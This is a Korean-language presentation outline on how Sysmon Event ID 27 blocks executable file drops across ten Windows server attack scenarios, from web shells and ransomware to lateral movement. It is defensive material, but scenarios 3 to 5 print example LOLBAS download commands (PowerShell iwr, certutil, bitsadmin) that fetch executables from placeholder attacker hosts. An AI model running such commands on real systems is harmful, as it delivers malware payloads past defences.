“**Sysmon Event ID 27 (FileBlockExecutable) 차단 기반 공격 차단 10개 시나리오**”

👉 포인트는 “**서버 현실 + LOLBAS + 랜섬웨어**”이며,
**과잉 로그 없이 ‘행위 자체를 차단’했다**는 메시지가 명확히 전달되도록 구성했습니다.

---

# 🛡️ Sysmon Event ID 27 기반 공격 차단 시나리오 10

> **Event ID 27 = 실행 파일 드롭을 ‘탐지’가 아니라 ‘즉시 차단’**

---

## 1️⃣ IIS 웹쉘 업로드 즉시 차단 (웹 침해)

**공격 시나리오**

* 웹 취약점(RCE, 파일 업로드)으로
* `C:\inetpub\wwwroot\shell.exe` 업로드 시도

**Event ID 27 동작**

* 웹루트에 **실행 파일(PE) 생성 시도 감지**
* **파일 생성 즉시 차단**

**결과**

* 웹쉘 실행 불가
* 침투 1단계에서 공격 종료

---

## 2️⃣ ASPX 웹쉘 → 2차 페이로드 드롭 차단

**공격 시나리오**

* `.aspx` 웹쉘은 올라갔으나
* 내부에서 `cmd.exe /c dropper.exe` 생성 시도

**Event ID 27 동작**

* 웹쉘이 생성한 `dropper.exe` 차단

**결과**

* 웹쉘은 있어도 **확장 공격 불가**
* 실질적 피해 없음

---

## 3️⃣ PowerShell LOLBAS 다운로드 공격 차단

**공격 시나리오**

```powershell
powershell -c iwr http://x.x.x.x/a.exe -OutFile C:\Windows\Temp\a.exe
```

**Event ID 27 동작**

* Temp 경로 실행 파일 생성 차단

**결과**

* LOLBAS 사용했지만 **파일 단계에서 종료**
* 네트워크 연결 이후 단계 차단

---

## 4️⃣ Certutil 기반 페이로드 드롭 차단

**공격 시나리오**

```cmd
certutil -urlcache -split -f http://evil/a.exe a.exe
```

**Event ID 27 동작**

* certutil이 생성한 실행 파일 차단

**결과**

* 서명된 LOLBAS라도 **결과물은 생성 불가**
* 우회 실패

---

## 5️⃣ Bitsadmin 다운로드 공격 차단

**공격 시나리오**

```cmd
bitsadmin /transfer job http://evil/r.exe C:\ProgramData\r.exe
```

**Event ID 27 동작**

* ProgramData 경로 실행 파일 차단

**결과**

* 백그라운드 다운로드 공격 실패
* 공격 은닉 시도 무력화

---

## 6️⃣ Rundll32 / Regsvr32 기반 로더 차단

**공격 시나리오**

* `rundll32.exe`로 DLL 로더 실행
* 내부에서 실행 파일 드롭

**Event ID 27 동작**

* 로더가 생성한 PE 파일 차단

**결과**

* Living-off-the-Land 방식 차단
* 메모리 공격 이전 단계 봉쇄

---

## 7️⃣ 랜섬웨어 본체 드롭 차단 (대량 암호화 이전)

**공격 시나리오**

* 초기 접근 후 랜섬웨어 본체 업로드
* `C:\Windows\Temp\locker.exe` 생성

**Event ID 27 동작**

* 랜섬웨어 실행 파일 차단

**결과**

* **암호화 시작 자체가 불가능**
* 데이터 피해 0

---

## 8️⃣ 스케줄러 기반 지속성 페이로드 차단

**공격 시나리오**

* `schtasks`로 실행될 파일 생성
* `C:\ProgramData\update.exe`

**Event ID 27 동작**

* 지속성용 실행 파일 차단

**결과**

* 재부팅 후 공격 지속 불가
* Persistence 단계 실패

---

## 9️⃣ 내부 확산(Lateral Movement) 페이로드 차단

**공격 시나리오**

* 이미 침해된 서버에서
* 다른 서버로 `psexec`/SMB를 통해 실행 파일 복사

**Event ID 27 동작**

* 대상 서버에서 실행 파일 생성 차단

**결과**

* **내부 확산 차단**
* 침해 범위 고립

---

## 🔟 공급망/운영 서버 악성 업데이트 차단

**공격 시나리오**

* 업데이트 서버/스크립트 변조
* 운영 서버에 악성 실행 파일 배포

**Event ID 27 동작**

* 정상 경로라도 **정책에 없는 실행 파일 차단**

**결과**

* 공급망 공격 무력화
* 운영 서버 보호

---

# 🎯 발표용 핵심 메시지

> **Event ID 27은 “로그를 남기는 보안”이 아니라
> “공격 자체를 시작하지 못하게 하는 보안”입니다.**

* ✔ LOLBAS 사용해도 소용없음
* ✔ 랜섬웨어 실행 단계 이전 차단
* ✔ 서버 로그 폭증 없음
* ✔ C 드라이브 추가 파일 생성 없음
* ✔ 실시간 차단 + 명확한 증거 로그

---

## 🔚 결론

> “우리는 공격을 분석하기 전에,
> **공격이 실행조차 되지 않게 만들었습니다.**
> 이것이 Sysmon 27번을 사용하는 이유입니다.”
